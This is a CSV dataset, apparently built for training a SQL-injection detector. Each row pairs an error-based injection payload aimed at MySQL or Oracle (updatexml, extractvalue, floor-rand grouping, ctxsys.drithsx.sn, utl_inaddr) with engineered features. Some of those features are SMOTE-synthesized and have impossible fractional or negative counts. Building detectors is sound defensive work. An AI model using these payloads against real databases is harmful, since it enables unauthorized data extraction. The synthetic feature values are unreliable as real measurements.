id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000486,attack,error,"-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000018,1.3677959107740307,327.2584151442954,34.0,3.5456200386318706,83.7415848557046,50.1292075721477,137.32301893036924,56.064603786073846,0.256075419974134,0.15312759083439365,0.41949271197573984,0.1713042772157325,0.532301893036925,0.0,1.0,0.0,0.0,2.0,0.0,29.06460378607385,0.0,1.4030943208892246,0.5323018930369248,23.0,0.5323018930369251,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000487,attack,error,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'ejul'  =  'ejul",nearest_attack_euclidean,R000009,0.19072718191323815,344.08315719920654,38.91421050585902,3.853589315947187,110.0,55.0,138.59789416405246,40.4852630351541,0.31995702744737897,0.15997851372368949,0.40245227564278097,0.11761218318615062,4.0,0.0,0.0,0.0,2.0,2.0,0.0,25.4852630351541,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000488,attack,error,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'jwbt'  =  'jwbt",nearest_attack_euclidean,R000063,1.8065352260919514,211.87863509749104,29.594139474731186,3.4113530882123384,50.25103859928316,35.74896140071684,97.6275964982079,28.25103859928316,0.23695515825322488,0.17072532412953356,0.4596547153223967,0.13266480229484484,2.1255192996415793,0.0,0.0,0.0,1.0,2.0,0.0,18.12551929964158,0.0,0.0,4.0,3.0,0.5313798249103948,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000489,attack,error,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'ejul'  =  'ejul",nearest_attack_euclidean,R000009,0.24946594917763915,343.16211027814336,39.0,3.8597357861614885,110.0,55.0,137.92968822251464,40.23242205562867,0.32061303644980915,0.16030651822490458,0.40185690200869156,0.11722354331659472,4.0,0.0,0.0,0.0,2.0,2.0,0.0,25.232422055628664,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000490,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000031,0.5364421951824516,213.50073131293203,38.0,3.7645754934555473,63.0,37.0,90.0004875419547,23.50024377097735,0.2951240680129237,0.17332683359489168,0.4215106948252433,0.11003840356694133,0.250121885488674,0.0,1.0,0.0,1.0,0.9999999999999999,0.0,16.250121885488674,0.0,0.0,3.0,3.0,0.25012188548867403,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000491,attack,error,"-3775'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000021,0.7530875898764124,215.6855908427675,39.55346233387243,3.8715119691579094,66.04404283629836,39.21384933548971,86.87423633710699,23.553462333872428,0.30616526207918277,0.1815793035074021,0.402795565513724,0.10945986889969117,1.0,0.0,1.0,0.0,1.0,1.2767311669362142,0.0,15.276731166936214,0.0,0.0,3.0,3.276731166936214,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.27673116693621425,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.276731166936214
SMOTE_000492,attack,error,"-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000018,1.1931855803486933,332.22081009143164,34.0,3.47302291225274,79.75583798171368,51.51167596342735,143.8312151371474,57.12208100914316,0.24011054712576924,0.15510523180568977,0.43283728484209855,0.17194693622644244,0.8779189908568384,0.0,1.0,0.0,0.0,2.0,0.0,30.244162018286325,0.0,0.0,0.8779189908568386,23.0,0.8779189908568383,0.0,0.0,0.12208100914316156,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.8779189908568384,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.12208100914316154,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000493,attack,error,"1'||  (  select 'oyyu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",nearest_attack_euclidean,R000013,0.5257241559935624,192.21816436315115,31.321816436315114,3.9160818818217256,50.57453149052092,47.0,66.64363287263023,28.0,0.2627985047533221,0.24465571973443662,0.34679343184066197,0.14575234367157927,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,6.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.3218164363151148,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.321816436315115
SMOTE_000494,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000025,0.5091507951833493,318.88133200874813,38.0,4.031992927446106,112.2871112716669,55.0,116.34666546249832,35.24755527458294,0.35282530897194037,0.17273196863763737,0.36405730887727317,0.11038541351314912,4.0,0.0,0.0,0.0,2.0,1.1782221820832774,0.0,21.069333092499665,0.0,0.0,6.0,4.178222182083278,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000495,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.6950295822799835,215.55488755175537,41.021955020702144,4.268355027172436,118.53293253105322,2.0,71.0,24.021955020702144,0.549890011318408,0.009279627533628154,0.3294267774437991,0.11140358370416471,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,5.021955020702147,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000496,attack,error,"-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000018,0.9919393465080611,328.2865650442164,34.0,3.5306362516288545,82.7134349557836,50.6432825221082,138.6082063052705,56.3216412610541,0.2521229576087759,0.15421908591582464,0.422106049318285,0.1715519071571144,0.6608206305270501,0.0,1.0,0.0,0.0,2.0,0.0,29.3216412610541,0.0,1.0175381084188502,0.6608206305270499,23.0,0.66082063052705,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000497,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000057,0.6467407188561007,291.95386528537273,37.684465305308734,4.022259460894698,108.31795509512426,41.737861221234944,105.00242040043298,36.89562856858058,0.37118483911460376,0.1428961467081587,0.3595944935650554,0.12632452061218216,3.526697957963103,0.0,0.0,0.0,2.0,1.8422326526543675,0.0,19.684465305308734,0.0,2.0,5.157767347345632,5.526697957963103,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.8422326526543675,0.0,0.8422326526543678,2.0,-1.1102230246251565e-16,0.8422326526543678,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.526697957963103
SMOTE_000498,attack,error,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000058,1.966574884020965,293.6271902712081,36.0,3.845706977281234,102.3922313510834,35.0,116.62719027120811,39.607768648916604,0.34997504279144365,0.11943549500299362,0.3959976395562894,0.13459182264927336,1.1961156755416988,2.803884324458301,0.0,0.0,2.0,2.0,0.0,22.205826486687453,1.4019421622291506,2.0,5.0,4.0,0.29902891888542465,0.7009710811145753,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000499,attack,error,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'ejul'  =  'ejul",nearest_attack_euclidean,R000009,0.26906031157208354,342.8851872873304,38.87897609668619,3.86037045239361,110.0,55.0,137.61133070721326,40.273856580117126,0.32117031790880907,0.16058515895440453,0.4008555334900647,0.11738898964672176,4.0,0.0,0.0,0.0,2.0,2.0,0.0,25.273856580117123,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000500,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000057,0.1442464259511625,300.1090777419075,37.94546112904623,4.017734823421026,110.70003620975426,43.0,108.46358040310706,37.94546112904623,0.36888051791200155,0.14328190413484623,0.36139576452638267,0.12644181342676955,3.8909222580924583,0.0,0.0,0.0,2.0,2.0,0.0,20.10907774190754,0.0,2.0,5.0,5.94546112904623,0.9727305645231146,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.9727305645231143,0.0,0.9727305645231143,2.0,0.054538870953770746,0.9727305645231146,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.972730564523115
SMOTE_000501,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,1.6858739404357614e-07,218.0,42.0,4.340822765840235,120.0,2.0,71.0,25.0,0.5504587155963303,0.009174311926605505,0.3256880733944954,0.11467889908256881,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,6.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000502,attack,error,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",nearest_attack_euclidean,R000029,1.3185209866500331,203.3622696608884,30.304601222120848,3.6941831946507993,57.528834219383775,38.390797555758304,81.22423299726293,26.218404888483395,0.27971618105716733,0.19218903112076635,0.39827562397110605,0.12981916385096026,4.0,0.0,0.0,0.0,0.0,1.3046012221208492,0.0,15.218404888483395,0.0,0.0,5.695398777879151,1.3046012221208496,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.6953987778791508,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.30460122212084906,0.30460122212084906,4.30460122212085
SMOTE_000503,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000047,0.3213568296909477,219.20593955963824,31.20593955963825,3.868296335286247,77.823758238553,37.0,79.5881208807235,24.79406044036175,0.3550134019956613,0.16879161968230352,0.3630826755522496,0.11311230276978552,4.0,0.0,0.0,0.0,0.0,1.7940604403617497,0.0,14.0,0.0,0.0,5.0,1.7940604403617497,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000504,attack,error,"-6085 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000078,0.3699607707502788,330.175056845187,33.17505684518701,3.488741559007381,80.0,52.0,142.0,56.175056845187,0.24229603087416496,0.1574924200682072,0.43007545480164283,0.170136094255985,0.17505684518700693,0.0,1.0,0.0,0.0,2.0,0.0,30.0,0.0,0.0,1.0,23.0,0.17505684518700704,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000505,attack,error,"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000026,0.38372625140350036,332.82419189275004,32.1498530714091,3.44351947618847,81.22477960711365,49.0,146.1498530714091,56.44955921422729,0.24404499004398628,0.14723571777420394,0.4391392321768091,0.16958006000500067,0.2997061428181944,0.0,0.0,0.0,0.0,2.0749265357045483,0.0,30.92507346429545,0.14985307140909732,0.0,1.0,22.07492653570455,0.07492653570454882,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0749265357045488,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.074926535704549
SMOTE_000506,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000055,0.5949289330377069,248.2809081071456,35.2809081071456,3.996732028731501,94.0,35.0,89.0,30.280908107145596,0.37860465471447585,0.14096981824475166,0.3584661092509399,0.12195941778983256,0.2809081071455959,0.0,0.0,0.0,2.0,0.9999999999999999,0.0,18.0,0.0,2.0,6.0,3.0,0.28090810714559583,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.0
SMOTE_000507,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",nearest_attack_euclidean,R000054,1.1927930579426052,210.44030127668154,31.437664780981265,3.857742784898732,72.00263649570026,37.562335219018735,76.59416195245316,24.281167609509367,0.33873205341258195,0.17984903716879044,0.36520948509185086,0.11620942432677674,4.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,14.0,0.0,0.0,5.281167609509367,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.281167609509367,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7188323904906331,0.7188323904906331,4.718832390490633
SMOTE_000508,attack,error,"-3775'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000021,0.10834042072890648,207.39338504713032,39.07962200269316,3.858384390678638,63.43792101481239,37.31848801077265,83.55735401885214,23.079622002693164,0.30587415846356486,0.17989472028915407,0.40289578151254324,0.11133533973473783,1.0,0.0,1.0,0.0,1.0,1.0398110013465809,0.0,15.039811001346582,0.0,0.0,3.0,3.039811001346581,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.03981100134658083,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.039811001346581
SMOTE_000509,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",nearest_attack_euclidean,R000041,0.4230613452577497,315.66434517580456,37.29314761406437,4.002982640095329,109.14657380703218,55.0,115.93147614064367,35.58629522812873,0.34599518188038636,0.17436526112123135,0.36694009692435997,0.11269946007402235,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.586295228128733,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.1465738070321831,0.8534261929678169,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000510,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",nearest_attack_euclidean,R000054,0.6111557712337115,215.74483801508885,31.613167092280804,3.9355123729063353,79.45266836912322,37.0,75.67900255368482,23.613167092280804,0.36827436193964574,0.17160593722143785,0.35065861671669707,0.10946108412221932,4.0,0.0,0.0,0.0,0.0,1.3868329077191959,0.0,13.226334184561608,0.0,0.0,5.0,1.3868329077191959,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
